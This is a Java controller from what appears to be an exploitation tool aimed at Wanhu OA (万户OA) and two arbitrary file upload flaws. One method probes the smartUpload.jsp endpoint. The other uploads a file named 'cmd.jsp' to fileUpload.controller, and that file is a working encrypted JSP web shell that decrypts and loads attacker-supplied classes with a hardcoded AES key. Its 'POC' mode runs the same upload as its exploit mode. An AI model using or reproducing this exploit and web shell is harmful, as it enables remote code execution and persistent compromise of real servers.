package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;

import java.net.MalformedURLException;

@BasicMapping(uri = "万户")
public class WanhuController extends Controller implements BasicController{
    public WanhuController(){

    }
@VulnerabilityDescriptionMapping(Description = "万户OA smartUpload.jsp 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_smartUpload(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_smartUpload");
    switch (type){
        case EXP:
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+"/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0");
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.responseBody.contains("选择文件") && result.statusCode==200){
                WriteLog(" 存在漏洞");
            }else {
                WriteLog(" 不存在漏洞");
            }
            WriteLog("\n"+result.responseBody);
    }
}

@VulnerabilityDescriptionMapping(Description = "万户OA fileUpload.controller 任意文件上传漏洞",SupportVulType = SupportVul.UploadFile)
    public void vul_fileUpload(Poc_Exp type, String target,Object... args) throws MalformedURLException {
    Cache.uiController.logTextArea.appendText("\n开始检测：  vul_fileUpload");
    switch (type){
        case EXP:
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+"/defaultroot/upload/fileUpload.controller");
            String data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"cmd.jsp\"\n" +
                    "Content-Type: application/octet-stream\n" +
                    "Content-Transfer-Encoding: binary\n" +
                    "\n" +
                    "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n" +
                    "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--";
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0");
            httpRequest.addHeaders("Connection","Keep-Alive");
            Response result = httpRequest.Post(data);
            if(result.responseBody.contains("success") && result.statusCode==200){
                WriteLog(" 存在漏洞"+result.responseBody);
            }else {
                WriteLog(" 不存在漏洞"+result.responseBody);
            }
    }
}

}
